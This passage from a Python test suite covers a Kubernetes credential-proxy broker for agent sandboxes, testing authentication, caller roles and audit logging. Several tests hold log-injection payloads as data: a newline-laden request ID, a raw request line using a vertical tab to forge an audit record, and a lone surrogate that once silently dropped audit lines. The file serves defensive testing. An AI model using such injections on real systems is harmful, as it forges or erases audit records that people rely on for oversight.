            policy_path.write_text(json.dumps({"rules": []}), encoding="utf-8")
            socket_path = Path(tmp) / "backend.sock"
            args = types.SimpleNamespace(
                policy=str(policy_path),
                host="127.0.0.1",
                port=0,
                unix_socket=str(socket_path),
                timeout_seconds=5,
                max_request_bytes=1 << 20,
                max_output_bytes=1 << 20,
                state_dir=str(Path(tmp) / "state"),
            )
            previous_umask = os.umask(0o000)
            try:
                with mock.patch.dict(
                    os.environ,
                    {
                        "API_SERVER_EXTERNAL_KEY": "external",
                        "CREDENTIAL_PROXY_SCOPED_SA_POOL": "0",
                    },
                    clear=True,
                ), \
                        mock.patch.object(credential_proxy, "ThreadingTCPHTTPServer", mock.MagicMock()), \
                        mock.patch.object(credential_proxy.threading, "Thread", FakeThread), \
                        mock.patch.object(credential_proxy.ThreadingUnixHTTPServer, "serve_forever", stop):
                    with self.assertRaises(self._Stop):
                        credential_proxy.serve(args)
                # Read back before the outer restore: the process umask has to be
                # the one it started with, because the same process goes on to run
                # proxied commands that must leave group-writable files behind.
                left_behind = os.umask(0o000)
            finally:
                os.umask(previous_umask)
                for server in bound:
                    server.server_close()

            self.assertEqual(0o000, left_behind, "serve did not restore the process umask")
            mode = socket_path.stat().st_mode & 0o777
            self.assertEqual(0o600, mode, f"backend socket mode is {mode:04o}")


class ExecAuditLineCannotBeForgedTest(unittest.TestCase):
    """One request must produce one audit record, whatever the caller sends.

    The exec line is the only thing that binds a command to a verified
    identity, and under a line-oriented text formatter (the one a local run or an
    older image installs; the deployed one is JSON, covered by
    test_credential_proxy_audit_json) a newline in
    any caller-supplied field ends the record and starts another, so an
    unsanitized `requestId` or `argv[0]` lets the caller write a complete,
    well-formed second entry naming a ServiceAccount that made no request.
    Reproduced against a real server before this was fixed.
    """

    FORGERY = (
        "x\n2026-01-01 00:00:00,000 INFO credential-proxy exec request_id=y "
        "principal=system:serviceaccount:kubeagents-system:other executable=kubectl"
    )

    class _RecordingExecutor:
        ALLOWED_EXECUTABLES = CommandExecutor.ALLOWED_EXECUTABLES

        def git_lease_violation(self, argv, cwd):
            # Refuse every git command, so the "git lease refused" line -- the
            # one that logs the caller's cwd -- is actually reached.
            return "no lease" if argv and argv[0] == "git" else None

        def execute(
            self,
            argv,
            stdin=None,
            cwd=None,
            kubeconfig_context=None,
            wants_kubeconfig=False,
            caller=None,
        ):
            return credential_proxy.ExecutionResult(
                exit_code=0, stdout="", stderr="",
                duration_ms=0, truncated=False, timed_out=False,
            )

    def setUp(self):
        for attribute in (
            "policy", "executor", "enforce_read_only", "max_request_bytes", "authenticator",
        ):
            self.addCleanup(
                self._restore,
                attribute,
                attribute in CredentialProxyHandler.__dict__,
                CredentialProxyHandler.__dict__.get(attribute),
            )
        CredentialProxyHandler.executor = self._RecordingExecutor()
        CredentialProxyHandler.policy = Policy(rules=[], blocked_message="blocked")
        CredentialProxyHandler.max_request_bytes = 1 << 20
        CredentialProxyHandler.enforce_read_only = True
        CredentialProxyHandler.authenticator = credential_proxy.NullAuthenticator()

        self.records = []
        # Without this the exec line is dropped: LOGGER's own level is NOTSET,
        # so it inherits root's WARNING under the test runner and the INFO
        # record the forgery rides on never reaches a handler. A capture that
        # sees nothing passes every assertion below.
        level = credential_proxy.LOGGER.level
        credential_proxy.LOGGER.setLevel(logging.INFO)
        self.addCleanup(credential_proxy.LOGGER.setLevel, level)

        class Capture(logging.Handler):
            def emit(inner, record):  # noqa: N805
                self.records.append(record.getMessage())

        self.capture = Capture()
        previous = list(credential_proxy.LOGGER.handlers)
        propagate = credential_proxy.LOGGER.propagate
        credential_proxy.LOGGER.handlers = [self.capture]
        credential_proxy.LOGGER.propagate = False
        self.addCleanup(setattr, credential_proxy.LOGGER, "propagate", propagate)
        self.addCleanup(setattr, credential_proxy.LOGGER, "handlers", previous)

        self.server = ThreadingHTTPServer(("127.0.0.1", 0), CredentialProxyHandler)
        self.endpoint = f"http://127.0.0.1:{self.server.server_address[1]}"
        threading.Thread(target=self.server.serve_forever, daemon=True).start()
        self.addCleanup(self.server.server_close)
        self.addCleanup(self.server.shutdown)

    @staticmethod
    def _restore(attribute, was_set, original):
        if was_set:
            setattr(CredentialProxyHandler, attribute, original)
        elif attribute in CredentialProxyHandler.__dict__:
            delattr(CredentialProxyHandler, attribute)

    def _post(self, payload):
        request = urllib.request.Request(
            self.endpoint + "/v1/exec",
            data=json.dumps(payload).encode(),
            headers={"Content-Type": "application/json"},
            method="POST",
        )
        try:
            with urllib.request.urlopen(request) as response:
                response.read()
        except urllib.error.HTTPError as exc:
            exc.read()

    def _assert_single_line_records(self, expected_substring):
        self.assertTrue(
            any(expected_substring in message for message in self.records),
            f"expected a record containing {expected_substring!r}; got {self.records!r}",
        )
        for message in self.records:
            self.assertNotIn(
                "\n", message,
                f"a newline in an audit record forges a second entry: {message!r}",
            )

    def test_a_newline_in_the_request_id_writes_no_second_record(self):
        self._post({"requestId": self.FORGERY, "argv": ["kubectl", "get", "pods"], "cwd": "/tmp"})
        self._assert_single_line_records("exec request_id=")
        self.assertNotIn(
            "some-other-agent", " ".join(self.records),
            "the caller must not be able to name a ServiceAccount in the audit trail",
        )

    def test_a_newline_in_the_executable_writes_no_second_record(self):
        # argv[0] is logged before the allowlist check, so at that point it is
        # arbitrary caller text.
        self._post({"requestId": "ok", "argv": ["ku\nbectl"], "cwd": "/tmp"})
        self._assert_single_line_records("executable blocked")

    def test_a_newline_in_the_cwd_writes_no_second_record(self):
        # The lease refusal is the one record that logs the cwd. It sits behind
        # the route's refusal of `git`, so admit `git` to reach it.
        routed = (*credential_proxy.EXEC_ROUTE_EXECUTABLES, "git")
        with mock.patch.object(credential_proxy, "EXEC_ROUTE_EXECUTABLES", routed):
            self._post({"requestId": "ok", "argv": ["git", "status"], "cwd": "/tmp/a\nb"})
        self._assert_single_line_records("git lease refused")

    def test_a_forge_cli_the_broker_runs_is_refused_on_exec(self):
        # The broker runs `gh` for its own verbs, so it is on ALLOWED_EXECUTABLES.
        # A sandbox caller that posts its own argv must still not reach it: the
        # sandbox reaches a forge only through the verbs.
        allowed = (*CommandExecutor.ALLOWED_EXECUTABLES, "gh")
        with mock.patch.object(CommandExecutor, "ALLOWED_EXECUTABLES", allowed):
            self._post({"requestId": "ok", "argv": ["gh", "pr", "create"], "cwd": "/tmp"})
        self.assertTrue(
            any("executable blocked" in m and "executable=gh" in m for m in self.records),
            self.records,
        )
        self.assertNotIn("gh", credential_proxy.EXEC_ROUTE_EXECUTABLES)


class AuditLogSurvivesAHostileRequestTest(unittest.TestCase):
    """The two ways the audit trail breaks that a str-only capture cannot see.

    Both need a handler that actually encodes to bytes, the way the deployed
    stderr handler does. `ExecAuditLineCannotBeForgedTest` above collects
    `record.getMessage()`, which is a str and therefore never encodes -- so it
    reproduces neither of these.
    """

    class _RecordingExecutor:
        ALLOWED_EXECUTABLES = CommandExecutor.ALLOWED_EXECUTABLES

        def __init__(self):
            self.executed = []

        def git_lease_violation(self, argv, cwd):
            return None

        def execute(
            self,
            argv,
            stdin=None,
            cwd=None,
            kubeconfig_context=None,
            wants_kubeconfig=False,
            caller=None,
        ):
            self.executed.append(argv)
            return credential_proxy.ExecutionResult(
                exit_code=0, stdout="", stderr="",
                duration_ms=0, truncated=False, timed_out=False,
            )

    def setUp(self):
        for attribute in (
            "policy", "executor", "enforce_read_only", "max_request_bytes", "authenticator",
        ):
            self.addCleanup(
                self._restore,
                attribute,
                attribute in CredentialProxyHandler.__dict__,
                CredentialProxyHandler.__dict__.get(attribute),
            )
        self.executor = self._RecordingExecutor()
        CredentialProxyHandler.executor = self.executor
        CredentialProxyHandler.policy = Policy(rules=[], blocked_message="blocked")
        CredentialProxyHandler.max_request_bytes = 1 << 20
        CredentialProxyHandler.enforce_read_only = True
        CredentialProxyHandler.authenticator = credential_proxy.NullAuthenticator()

        # errors="strict" on purpose: the point of the surrogate case is that a
        # real encoder refuses the record and logging drops it.
        self.raw = io.BytesIO()
        stream = io.TextIOWrapper(self.raw, encoding="utf-8", errors="strict", write_through=True)
        handler = logging.StreamHandler(stream)
        handler.setFormatter(logging.Formatter("%(asctime)s %(levelname)s %(name)s %(message)s"))

        # One record should be one physical line. Counting them separately is
        # what turns "did the caller inject a line" into an assertion that does
        # not depend on guessing what the line would look like.
        self.emitted = []

        class Counter(logging.Handler):
            def emit(inner, record):  # noqa: N805
                self.emitted.append(record)

        previous = list(credential_proxy.LOGGER.handlers)
        propagate = credential_proxy.LOGGER.propagate
        level = credential_proxy.LOGGER.level
        credential_proxy.LOGGER.handlers = [handler, Counter()]
        credential_proxy.LOGGER.propagate = False
        credential_proxy.LOGGER.setLevel(logging.INFO)
        self.addCleanup(credential_proxy.LOGGER.setLevel, level)
        self.addCleanup(setattr, credential_proxy.LOGGER, "propagate", propagate)
        self.addCleanup(setattr, credential_proxy.LOGGER, "handlers", previous)

        self.server = ThreadingHTTPServer(("127.0.0.1", 0), CredentialProxyHandler)
        self.port = self.server.server_address[1]
        self.endpoint = f"http://127.0.0.1:{self.port}"
        threading.Thread(target=self.server.serve_forever, daemon=True).start()
        self.addCleanup(self.server.server_close)
        self.addCleanup(self.server.shutdown)

    @staticmethod
    def _restore(attribute, was_set, original):
        if was_set:
            setattr(CredentialProxyHandler, attribute, original)
        elif attribute in CredentialProxyHandler.__dict__:
            delattr(CredentialProxyHandler, attribute)

    def lines(self):
        return self.raw.getvalue().decode("utf-8", "replace").splitlines()

    def test_the_request_line_cannot_start_a_second_record(self):
        """The access log runs before authentication, on every response.

        BaseHTTPRequestHandler hands `self.requestline` to log_message raw. A
        vertical tab is enough to end the record, so an unauthenticated caller
        could write an audit-shaped line of its own -- worse than the
        authenticated forgery, because it needs no credential at all.
        """
        connection = socket.create_connection(("127.0.0.1", self.port))
        self.addCleanup(connection.close)
        connection.sendall(
            b"GET\x0bexec|request_id=deadbeef"
            b"|principal=system:serviceaccount:kubeagents-system:someone-else"
            b"|executable=kubectl /healthz HTTP/1.1\r\nHost: x\r\n\r\n"
        )
        connection.settimeout(2)
        try:
            connection.recv(4096)
        except OSError:
            pass

        lines = self.lines()
        self.assertTrue(
            any("someone-else" in line for line in lines),
            "the request line should still be logged, just not on a line of its own",
        )
        self.assertEqual(
            len(self.emitted), len(lines),
            f"{len(self.emitted)} records became {len(lines)} lines, so the caller "
            f"emitted one of its own: {lines!r}",
        )
        for line in lines:
            self.assertNotRegex(
                line, r"^credential-proxy exec |^exec request_id=",
                "a line began with audit-record text rather than a timestamp",
            )

    def test_a_lone_surrogate_does_not_delete_the_audit_line(self):
        """A dropped record is worse than a forged one: the command still runs.

        json.loads turns "\\ud800" into a real lone surrogate. No UTF-8 encoder
        accepts one, so before this was fixed the handler raised
        UnicodeEncodeError, logging printed "--- Logging error ---" to stderr,
        and both the exec line and the completion line were dropped -- while
        the command executed and returned 200.
        """
        request = urllib.request.Request(
            self.endpoint + "/v1/exec",
            data=b'{"requestId":"\\ud800","argv":["kubectl","get","pods"],"cwd":"/tmp"}',
            headers={"Content-Type": "application/json"},
            method="POST",
        )
        with urllib.request.urlopen(request) as response:
            self.assertEqual(200, response.status)
        self.assertEqual([["kubectl", "get", "pods"]], self.executor.executed)

        lines = self.lines()
        self.assertTrue(
            any("exec request_id=" in line and "executable=kubectl" in line for line in lines),
            f"the command ran and left no exec line: {lines!r}",
        )
        self.assertTrue(
            any("command complete" in line for line in lines),
            f"the command ran and left no completion line: {lines!r}",
        )


class ServiceAccountAuthenticatorTest(unittest.TestCase):
    """The verifier itself: what it accepts, and everything it refuses."""

    AUDIENCE = "kubeagents-credential-proxy"
    CALLER = "system:serviceaccount:kubeagents-system:agent"

    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.addCleanup(self.tmp.cleanup)
        self.own_token = Path(self.tmp.name) / "token"
        self.own_token.write_text("broker-own-token", encoding="utf-8")
        self.reviews = []

    def _authenticator(self, **overrides):
        kwargs = dict(
            audience_roles={self.AUDIENCE: ""},
            allowed_callers=frozenset({self.CALLER}),
            api_host="10.0.0.1",
            api_port="443",
            ca_file="",
            token_file=str(self.own_token),
            cache_seconds=0.0,
        )
        kwargs.update(overrides)
        return credential_proxy.ServiceAccountAuthenticator(**kwargs)

    def _with_review(self, authenticator, status):
        """Replace the API round trip, keeping every check that reads it."""

        def fake_review(token):
            self.reviews.append(token)
            return authenticator._principal_from({"status": status})

        authenticator._review = fake_review
        return authenticator

    @staticmethod
    def _headers(value):
        return {"Authorization": value} if value is not None else {}

    def _ok_status(self, **overrides):
        status = {
            "authenticated": True,
            "audiences": [self.AUDIENCE],
            "user": {
                "username": self.CALLER,
                "uid": "sa-uid",
                "groups": ["system:serviceaccounts"],
            },
        }
        status.update(overrides)
        return status

    def test_a_verified_token_yields_the_principal_from_the_review(self):
        authenticator = self._with_review(self._authenticator(), self._ok_status())
        principal = authenticator.authenticate(self._headers("Bearer agent-token"))
        self.assertEqual(self.CALLER, principal.workload)
        self.assertEqual("sa-uid", principal.uid)
        self.assertIn("system:serviceaccounts", principal.groups)
        # Reserved for a per-caller identity; nothing today may invent it.
        self.assertIsNone(principal.caller)
        self.assertEqual(["agent-token"], self.reviews)

    def test_no_header_is_rejected(self):
        authenticator = self._with_review(self._authenticator(), self._ok_status())
        with self.assertRaises(credential_proxy.AuthenticationError):
            authenticator.authenticate(self._headers(None))
        self.assertEqual([], self.reviews, "an absent token must not reach the API server")

    def test_a_non_bearer_scheme_is_rejected(self):
        authenticator = self._with_review(self._authenticator(), self._ok_status())
        with self.assertRaises(credential_proxy.AuthenticationError):
            authenticator.authenticate(self._headers("Basic YWJjOmRlZg=="))

    def test_an_unauthenticated_review_is_rejected(self):
        authenticator = self._with_review(
            self._authenticator(), self._ok_status(authenticated=False)
        )
        with self.assertRaises(credential_proxy.AuthenticationError):
            authenticator.authenticate(self._headers("Bearer forged"))

    def test_a_token_for_another_audience_is_rejected(self):
        # The audience is what stops a token minted for the Kubernetes API, or
        # for any other service, being replayed at the broker.
        authenticator = self._with_review(
            self._authenticator(), self._ok_status(audiences=["https://kubernetes.default.svc"])
        )
        with self.assertRaises(credential_proxy.AuthenticationError):
            authenticator.authenticate(self._headers("Bearer other-audience"))

    def test_a_caller_outside_the_allowlist_is_rejected(self):
        authenticator = self._with_review(
            self._authenticator(),
            self._ok_status(user={"username": "system:serviceaccount:default:someone-else"}),
        )
        with self.assertRaises(credential_proxy.AuthenticationError):
            authenticator.authenticate(self._headers("Bearer wrong-sa"))

    def test_an_api_server_error_is_a_rejection_not_an_allow(self):
        authenticator = self._authenticator()

        def explode(request, *args, **kwargs):
            raise urllib.error.URLError("connection refused")

        with mock.patch.object(credential_proxy.urllib.request, "urlopen", explode):
            with self.assertRaises(credential_proxy.AuthenticationError):
                authenticator.authenticate(self._headers("Bearer agent-token"))

    def test_the_review_asks_for_the_configured_audience(self):
        authenticator = self._authenticator()
        captured = {}

        class Response(io.BytesIO):
            def __enter__(self):
                return self

            def __exit__(self, *exc):
                return False

        def fake_urlopen(request, *args, **kwargs):
            captured["url"] = request.full_url
            captured["body"] = json.loads(request.data.decode("utf-8"))
            captured["authorization"] = request.get_header("Authorization")
            return Response(json.dumps({"status": self._ok_status()}).encode("utf-8"))

        with mock.patch.object(credential_proxy.urllib.request, "urlopen", fake_urlopen):
            authenticator.authenticate(self._headers("Bearer agent-token"))

        self.assertEqual(
            "https://10.0.0.1:443/apis/authentication.k8s.io/v1/tokenreviews",
            captured["url"],
        )
        self.assertEqual([self.AUDIENCE], captured["body"]["spec"]["audiences"])
        self.assertEqual("agent-token", captured["body"]["spec"]["token"])
        self.assertEqual("Bearer broker-own-token", captured["authorization"])

    def test_a_verified_token_is_cached_rather_than_re_reviewed(self):
        authenticator = self._with_review(
            self._authenticator(cache_seconds=300.0), self._ok_status()
        )
        authenticator.authenticate(self._headers("Bearer agent-token"))
        authenticator.authenticate(self._headers("Bearer agent-token"))
        self.assertEqual(["agent-token"], self.reviews)

    def test_a_rejected_token_is_never_cached(self):
        authenticator = self._with_review(
            self._authenticator(cache_seconds=300.0), self._ok_status(authenticated=False)
        )
        for _ in range(2):
            with self.assertRaises(credential_proxy.AuthenticationError):
                authenticator.authenticate(self._headers("Bearer forged"))
        self.assertEqual(["forged", "forged"], self.reviews)


class PrincipalAuditLineTest(unittest.TestCase):
    """The audit line has to name the whole ServiceAccount.

    `system:serviceaccount:<ns>:<name>` passes 64 characters at ordinary
    lengths, and the sanitizer's default cap then removes the tail -- the part
    that says which ServiceAccount it was. Observed live: the dev install
    logged `...:kubeagents-platform-agen`.
    """

    def test_a_65_character_principal_is_not_truncated(self):
        principal = "system:serviceaccount:kubeagents-system:kubeagents-platform-agent"
        self.assertEqual(65, len(principal))
        self.assertEqual(
            principal,
            credential_proxy._sanitize_for_logging(principal, max_length=512),
        )

    def test_the_default_cap_is_unchanged_for_agent_supplied_values(self):
        self.assertEqual(64, len(credential_proxy._sanitize_for_logging("x" * 200)))

    def test_control_characters_are_still_stripped_at_the_wider_cap(self):
        self.assertEqual(
            "systemserviceaccount",
            credential_proxy._sanitize_for_logging("system\nservice\raccount", max_length=512),
        )


class AudienceRoleTest(unittest.TestCase):
    """The audience is the only thing that tells the broker's two callers apart.

    Both Pods run as ServiceAccounts on CREDENTIAL_PROXY_ALLOWED_CALLERS, and
    the gateway shares its with the broker, so the TokenReview username says
    only that the caller was entitled to call -- not which of the two it was.
    """

    SHELL = "kubeagents-credential-proxy"
    CHAT = "kubeagents-credential-proxy-chat"
    CALLER = "system:serviceaccount:kubeagents-system:agent"

    def _authenticator(self):
        return credential_proxy.ServiceAccountAuthenticator(
            audience_roles={
                self.SHELL: credential_proxy.CALLER_ROLE_SHELL,
                self.CHAT: credential_proxy.CALLER_ROLE_CHAT,
            },
            allowed_callers=frozenset({self.CALLER}),
            api_host="10.0.0.1",
            api_port="443",
            ca_file="",
            token_file="/nonexistent",
            cache_seconds=0.0,
        )

    def _status(self, audiences):
        return {
            "authenticated": True,
            "audiences": audiences,
            "user": {"username": self.CALLER, "uid": "sa-uid", "groups": []},
        }

    def test_the_validated_audience_becomes_the_role(self):
        authenticator = self._authenticator()
        self.assertEqual(
            credential_proxy.CALLER_ROLE_SHELL,
            authenticator._principal_from({"status": self._status([self.SHELL])}).role,
        )
        self.assertEqual(
            credential_proxy.CALLER_ROLE_CHAT,
            authenticator._principal_from({"status": self._status([self.CHAT])}).role,
        )

    def test_an_audience_this_broker_does_not_know_is_refused(self):
        with self.assertRaises(credential_proxy.AuthenticationError):
            self._authenticator()._principal_from(
                {"status": self._status(["https://kubernetes.default.svc"])}
            )

    def test_a_token_naming_both_audiences_is_refused(self):
        # A token minted for both would be one caller holding both roles, which
        # is the separation gone. Refusing beats picking one.
        with self.assertRaises(credential_proxy.AuthenticationError):
            self._authenticator()._principal_from(
                {"status": self._status([self.SHELL, self.CHAT])}
            )

    def test_the_review_asks_for_every_audience_the_broker_knows(self):
        # A TokenReview that named only one would reject the other caller
        # outright rather than telling the two apart.
        captured = {}

        class Response:
            def __init__(self, payload):
                self.payload = payload

            def read(self):
                return self.payload

            def __enter__(self):
                return self

            def __exit__(self, *exc):
                return False

        authenticator = self._authenticator()
        token_file = Path(tempfile.mkdtemp()) / "token"
        token_file.write_text("broker-own-token", encoding="utf-8")
        authenticator.token_file = str(token_file)

        def fake_urlopen(request, *args, **kwargs):
            captured["body"] = json.loads(request.data.decode("utf-8"))
            return Response(json.dumps({"status": self._status([self.CHAT])}).encode())

        with mock.patch.object(credential_proxy.urllib.request, "urlopen", fake_urlopen):
            authenticator.authenticate({"Authorization": "Bearer gateway-token"})

        self.assertEqual([self.SHELL, self.CHAT], captured["body"]["spec"]["audiences"])


class SessionCallerBindingTest(unittest.TestCase):
    """The session ServiceAccount and the session audience go together.

    The role comes from the audience, and a pod picks the audience it projects.
    Without a binding, a pod running as the session ServiceAccount that
    projected the shell audience would get the shell role; the binding refuses
    that, and refuses the session audience to anyone else.
    """

    SHELL = "kubeagents-credential-proxy"
    CHAT = "kubeagents-credential-proxy-chat"
    SESSION = "kubeagents-credential-proxy-session"
    AGENT = "system:serviceaccount:kubeagents-system:agent"
    SESSION_SA = "system:serviceaccount:kubeagents-system:agent-a2a-session"

    def _authenticator(self, session_callers=frozenset({SESSION_SA})):
        return credential_proxy.ServiceAccountAuthenticator(
            audience_roles={
                self.SHELL: credential_proxy.CALLER_ROLE_SHELL,
                self.CHAT: credential_proxy.CALLER_ROLE_CHAT,
                self.SESSION: credential_proxy.CALLER_ROLE_SESSION,
            },
            allowed_callers=frozenset({self.AGENT, self.SESSION_SA}),
            session_callers=session_callers,
            api_host="10.0.0.1",
            api_port="443",
            ca_file="",
            token_file="/nonexistent",
            cache_seconds=0.0,
        )

    def _review(self, username, audience):
        return {
            "status": {
                "authenticated": True,
                "audiences": [audience],
                "user": {"username": username, "uid": "sa-uid", "groups": []},
            }
        }

    def test_a_session_caller_presenting_the_shell_audience_is_refused(self):
        with self.assertRaisesRegex(
            credential_proxy.AuthenticationError, "only the session audience"
        ):
            self._authenticator()._principal_from(self._review(self.SESSION_SA, self.SHELL))

    def test_a_session_caller_presenting_the_chat_audience_is_refused(self):
        with self.assertRaises(credential_proxy.AuthenticationError):
            self._authenticator()._principal_from(self._review(self.SESSION_SA, self.CHAT))

    def test_a_session_caller_presenting_the_session_audience_is_the_session_role(self):
        principal = self._authenticator()._principal_from(
            self._review(self.SESSION_SA, self.SESSION)
        )
        self.assertEqual(credential_proxy.CALLER_ROLE_SESSION, principal.role)

    def test_another_caller_presenting_the_session_audience_is_refused(self):
        with self.assertRaisesRegex(
            credential_proxy.AuthenticationError, "only for session callers"
        ):
            self._authenticator()._principal_from(self._review(self.AGENT, self.SESSION))

    def test_the_shell_caller_keeps_the_shell_role(self):
        principal = self._authenticator()._principal_from(self._review(self.AGENT, self.SHELL))
        self.assertEqual(credential_proxy.CALLER_ROLE_SHELL, principal.role)

    def test_with_no_session_callers_named_the_audience_alone_decides(self):
        # The upgrade case: a broker rendered by an operator that names no
        # session callers behaves as it did before the binding existed.
        principal = self._authenticator(frozenset())._principal_from(
            self._review(self.AGENT, self.SESSION)
        )
        self.assertEqual(credential_proxy.CALLER_ROLE_SESSION, principal.role)


class PrincipalPodTest(unittest.TestCase):
    """A brokered call names the pod that made it, so it traces to a conversation."""

    CALLER = "system:serviceaccount:kubeagents-system:agent-a2a-session"
    AUDIENCE = "kubeagents-credential-proxy"

    def _authenticator(self):
        return credential_proxy.ServiceAccountAuthenticator(
            audience_roles={self.AUDIENCE: ""},
            allowed_callers=frozenset({self.CALLER}),
            api_host="10.0.0.1",
            api_port="443",
            ca_file="",
            token_file="/nonexistent",
            cache_seconds=0.0,
        )

    def _review(self, extra):
        user = {"username": self.CALLER, "uid": "sa-uid", "groups": []}
        if extra is not None:
            user["extra"] = extra
        return {"status": {"authenticated": True, "audiences": [self.AUDIENCE], "user": user}}

    def test_the_pod_name_comes_from_the_token_review(self):
        principal = self._authenticator()._principal_from(
            self._review(
                {
                    "authentication.kubernetes.io/pod-name": ["agent-a2a-session-abc12"],
                    "authentication.kubernetes.io/pod-uid": ["0f1e2d3c"],
                }
            )
        )
        self.assertEqual("agent-a2a-session-abc12", principal.pod)
        # The pod rides on the principal and in the audit record's own field,
        # never in describe(): that string is the `principal` field of every
        # tool_execution_audit record, and the shell's calls carry a pod name
        # too, so a composite there would change an identity every filter
        # keys on.
        self.assertEqual(principal.pod, "agent-a2a-session-abc12")
        self.assertEqual(self.CALLER, principal.describe())
        record = credential_proxy._tool_audit(
            credential_proxy.AUDIT_STATUS_STARTED, "req-1", principal.describe(), "kubectl", "get", pod=principal.pod
        )
        self.assertEqual(record["pod"], "agent-a2a-session-abc12")
        self.assertEqual(record["principal"], self.CALLER)
        bare = credential_proxy._tool_audit(
            credential_proxy.AUDIT_STATUS_STARTED, "req-2", self.CALLER, "kubectl", "get", pod=""
        )
        self.assertNotIn("pod", bare)

    def test_a_token_with_no_pod_binding_names_no_pod(self):
        for extra in (None, {}, {"authentication.kubernetes.io/pod-name": []}):
            with self.subTest(extra=extra):
                principal = self._authenticator()._principal_from(self._review(extra))
                self.assertEqual("", principal.pod)
                self.assertEqual(self.CALLER, principal.describe())


class RequiredRoleTest(unittest.TestCase):
    """Which side of the split each route belongs to.

    Reads ``required_roles`` (plural) since this branch: a route can admit more
    than one caller role, because the /v1/chat/api passthrough is shared by the
    legacy chat relay and the A2A one — one credential, one relay instance per
    install. The
    singular ``required_role`` these tests were written against returned the
    first match and could not express that.
    """

    def test_the_shell_routes(self):
        for path in ("/v1/github/refresh", "/v1/workspace/open"):
            with self.subTest(path=path):
                self.assertEqual(
                    (credential_proxy.CALLER_ROLE_SHELL,),
                    credential_proxy.required_roles(path),
                )

    def test_the_exec_route_admits_the_shell_and_the_session(self):
        self.assertEqual(
            (credential_proxy.CALLER_ROLE_SHELL, credential_proxy.CALLER_ROLE_SESSION),
            credential_proxy.required_roles("/v1/exec"),
        )

    def test_the_chat_routes(self):
        for path in ("/v1/chat/slack/events", "/v1/chat/google/api"):
            with self.subTest(path=path):
                self.assertEqual(
                    (credential_proxy.CALLER_ROLE_CHAT,),
                    credential_proxy.required_roles(path),
                )

    def test_the_shared_api_passthrough_admits_both_chat_callers(self):
        """The case the plural exists for, and the reason a rename was not enough.

        Both relays hold the same app credential and must reach the API
        passthrough, while each side's event route stays its own. Under the
        singular form this route resolved to whichever role matched first, so
        one of the two consumers was refused a route it is entitled to.
        """
        self.assertEqual(
            (credential_proxy.CALLER_ROLE_CHAT, credential_proxy.CALLER_ROLE_A2A_CHAT),
            credential_proxy.required_roles("/v1/chat/api"),
        )

    def test_the_a2a_event_route_stays_its_own(self):
        self.assertEqual(
            (credential_proxy.CALLER_ROLE_A2A_CHAT,),
            credential_proxy.required_roles("/v1/chat/a2a/events"),
        )

    def test_a_route_belonging_to_neither(self):
        self.assertEqual((), credential_proxy.required_roles("/healthz"))


class RouteRolesTableTest(unittest.TestCase):
    """The shape checks that keep ROUTE_ROLES able to enforce what it says.

    Three ways this table can be mis-edited into admitting a caller it should
    refuse, none of which any linter here would catch and none of which shows
    up as a failing route. ``_validate_route_roles`` runs at import, so a
    mis-shaped table fails every test module rather than shipping; these pin
    that it still does, and name the escalation each one prevents.
    """

    def test_the_shipped_table_is_valid(self):
        credential_proxy._validate_route_roles(credential_proxy.ROUTE_ROLES)

    def test_a_bare_string_entry_is_refused(self):
        """The old (prefix, role) shape, which turns membership into substring.

        ``principal.role in "a2a-chat"`` is true for the legacy chat role, so
        this entry would hand the chat relay the A2A event routes.
        """
        self.assertIn(
            credential_proxy.CALLER_ROLE_CHAT, credential_proxy.CALLER_ROLE_A2A_CHAT
        )
        with self.assertRaises(TypeError):
            credential_proxy._validate_route_roles(
                (("/v1/chat/a2a/", credential_proxy.CALLER_ROLE_A2A_CHAT),)
            )

    def test_a_role_that_is_not_a_role_is_refused(self):
        with self.assertRaises(ValueError):
            credential_proxy._validate_route_roles((("/v1/chat/a2a/", ("a2a_chat",)),))

    def test_an_empty_prefix_is_refused(self):
        """An empty prefix matches every path and shadows the whole table."""
        with self.assertRaises(ValueError):
            credential_proxy._validate_route_roles(
                (("", (credential_proxy.CALLER_ROLE_SHELL,)),)
            )

    def test_sorting_the_table_is_refused(self):
        """The escalation a tidying edit reaches without mistyping anything.

        "/v1/chat/" sorts ahead of "/v1/chat/a2a/", so an alphabetized table
        answers the A2A event routes with the chat role and the legacy relay
        walks in. Sorted output is checked rather than a hand-written pair, so
        this stays true as routes are added.
        """
        table = tuple(sorted(credential_proxy.ROUTE_ROLES))
        self.assertNotEqual(credential_proxy.ROUTE_ROLES, table)
        with self.assertRaises(ValueError):
            credential_proxy._validate_route_roles(table)

    def test_a_duplicate_prefix_is_refused(self):
        """The second entry is dead, so its roles are a comment, not a rule."""
        with self.assertRaises(ValueError):
            credential_proxy._validate_route_roles(
                (
                    ("/v1/chat/", (credential_proxy.CALLER_ROLE_CHAT,)),
                    ("/v1/chat/", (credential_proxy.CALLER_ROLE_A2A_CHAT,)),
                )
            )


class RolePermitsTest(unittest.TestCase):
    """The 403 that keeps each caller on its own routes."""

    def _handler(self, path, role):
        handler = CredentialProxyHandler.__new__(CredentialProxyHandler)
        handler.path = path
        handler.replies = []
        handler._json = lambda status, payload: handler.replies.append((status, payload))
        principal = credential_proxy.Principal(
            workload="system:serviceaccount:ns:agent", uid="u", groups=(), role=role
        )
        return handler, principal

    def test_the_shell_cannot_reach_a_chat_route(self):
        handler, principal = self._handler(
            "/v1/chat/slack/api", credential_proxy.CALLER_ROLE_SHELL
        )
        with self.assertLogs(credential_proxy.LOGGER, level="WARNING"):
            self.assertFalse(handler._role_permits(principal))
        status, payload = handler.replies[0]
        self.assertEqual(HTTPStatus.FORBIDDEN, status)
        self.assertEqual("CALLER_ROLE_FORBIDDEN", payload["code"])

    def test_the_gateway_cannot_reach_an_exec_route(self):
        handler, principal = self._handler("/v1/exec", credential_proxy.CALLER_ROLE_CHAT)
        with self.assertLogs(credential_proxy.LOGGER, level="WARNING"):
            self.assertFalse(handler._role_permits(principal))
        self.assertEqual(HTTPStatus.FORBIDDEN, handler.replies[0][0])

    def test_each_caller_reaches_its_own(self):
        for path, role in (
            ("/v1/exec", credential_proxy.CALLER_ROLE_SHELL),
            ("/v1/chat/slack/api", credential_proxy.CALLER_ROLE_CHAT),
        ):
            with self.subTest(path=path):
                handler, principal = self._handler(path, role)
                self.assertTrue(handler._role_permits(principal))
                self.assertEqual([], handler.replies)

    def test_a_principal_with_no_role_reaches_everything(self):
        # The NullAuthenticator, and a broker an older operator has not yet
        # given a second audience. Neither may be locked out mid-upgrade.
        for path in ("/v1/exec", "/v1/chat/slack/api", "/healthz"):
